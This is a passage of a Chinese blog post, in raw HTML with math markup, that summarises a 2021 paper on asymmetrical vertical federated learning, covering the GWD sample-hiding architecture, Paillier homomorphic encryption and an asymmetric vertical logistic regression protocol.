vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 将数据分发给 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 以完成梯度和损失的解密，并完成局部模型的更新</li></ol><p>为了让强方不知道虚拟样本的存在，一种可行的方式是实现语义安全的加密方案，比如<code>Paillier同态加密</code>。此外，因为引入的恒等式严格保证每一步的中间结果不变，使用GWD方法实现的非对称模型训练将表现出与标准（对称）模型训练方案相同的性能。</p><p><img src="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/image-20220717154849377.png" alt></p><p>图4展示了GWD架构，其展示了一个通用子例程的联邦执行过程。弱方将会发送密文消息 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>v</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">v_1,v_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 给强方，然后等待来自强方关于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><mi>b</mi><mi>r</mi><mi>o</mi><mi>u</mi><mi>t</mi><mi>i</mi><mi>n</mi><mi>e</mi><mo stretchy="false">(</mo><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>v</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">subroutine(v_1,v_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">b</span><span class="mord mathnormal">ro</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord mathnormal">in</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 的执行结果 。由于直接传输会泄露真实ID信息。因此，弱方在发送 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>v</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">v_1,v_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的同时会加上关于虚假样本的数学等价符 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>e</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>e</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">e_1,e_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ，最终会收到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><mi>b</mi><mi>r</mi><mi>o</mi><mi>u</mi><mi>t</mi><mi>i</mi><mi>n</mi><mi>e</mi><mo stretchy="false">(</mo><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>v</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>e</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>e</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mi>s</mi><mi>u</mi><mi>b</mi><mi>r</mi><mi>o</mi><mi>u</mi><mi>t</mi><mi>i</mi><mi>n</mi><mi>e</mi><mo stretchy="false">(</mo><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>v</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">subroutine(v_1,v_2,e_1,e_2)= subroutine(v_1,v_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">b</span><span class="mord mathnormal">ro</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord mathnormal">in</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">b</span><span class="mord mathnormal">ro</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord mathnormal">in</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。此外，强方会运算 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><mi>b</mi><mi>r</mi><mi>o</mi><mi>u</mi><mi>t</mi><mi>i</mi><mi>n</mi><mi>e</mi><mo stretchy="false">(</mo><mo>⋅</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">subroutine(\cdot)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">b</span><span class="mord mathnormal">ro</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord mathnormal">in</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord">⋅</span><span class="mclose">)</span></span></span></span> ， 而不会察觉真实ID。</p><p><em>（没看懂得1和2的关系，以及为啥要加e）</em></p><h2 id="Asymmetrical-Vertical-Logistic-Regression">Asymmetrical Vertical Logistic Regression</h2><p>不妨先看看<a href="https://arxiv.org/pdf/1911.09824.pdf">Shengwen Yang, Bing Ren, Xuhui Zhou, and Liping Liu. Parallel distributed logistic regression for vertical federated learning without third-party coordinator. arXiv preprint arXiv:1911.09824, 2019.</a>中的无协调者的纵向联邦逻辑回归训练方案：</p><p><img src="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/image-20220718120809184.png" alt></p><p>Party A 拥有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>A</mi></msub><mo separator="true">,</mo><msub><mi mathvariant="normal">Θ</mi><mi>A</mi></msub><mo separator="true">,</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x_{A}, \Theta_{A}, y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">Θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>，而Party B 拥有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>B</mi></msub><mo separator="true">,</mo><msub><mi mathvariant="normal">Θ</mi><mi>B</mi></msub></mrow><annotation encoding="application/x-tex">x_{B}, \Theta_{B}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">Θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，这些数据都是不能直接明文传输的。</p><p>Step 3 中Party A 向 Party B传输同态密文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mtext> ⁣</mtext><mo stretchy="false">[</mo><mo stretchy="false">(</mo><msub><mi>y</mi><mi>i</mi></msub><mo>−</mo><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover><mo stretchy="false">)</mo><mo stretchy="false">]</mo><mtext> ⁣</mtext><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[\![(y_i-\hat{y_i})]\!]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mspace" style="margin-right:-0.1667em;"></span><span class="mopen">[(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span></span></span></span></span></span><span class="mclose">)]</span><span class="mspace" style="margin-right:-0.1667em;"></span><span class="mclose">]</span></span></span></span> 的原因在于明文的**<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>y</mi><mi>i</mi></msub><mo>−</mo><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(y_i-\hat{y_i})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 在分类任务中会泄露信息**，由于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>≤</mo><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover><mo>≤</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0\le\hat{y_i}\le1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，真实标签<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">y_i=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 则式子为负数，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">y_i=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 则对应式子为正数。补充：这在梯度泄露攻击中是一种常用的恢复真实标签的方法。</p><p><em>（不明白计算机是怎么计算梯度的，仅利用加法同态就能计算出梯度？）</em></p><p>接着再看以<strong>无协调者的纵向联邦逻辑回归训练</strong>为基础，使用<code>GWD</code>方法将其调整为不对称的训练协议，然后使用算法2中提出的非对称纵向逻辑回归（AVLR）训练协议进行训练。（注意：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 对应上表中的Party A，而 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 对应上表中的Party B）</p><p><img src="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/image-20220718121752417.png" alt></p><p><img src="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/image-20220718121809066.png" alt></p><blockquote><p>对于存在于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>I</mi><mn>1</mn><mi>o</mi></msubsup><mi mathvariant="normal">/</mi><mo 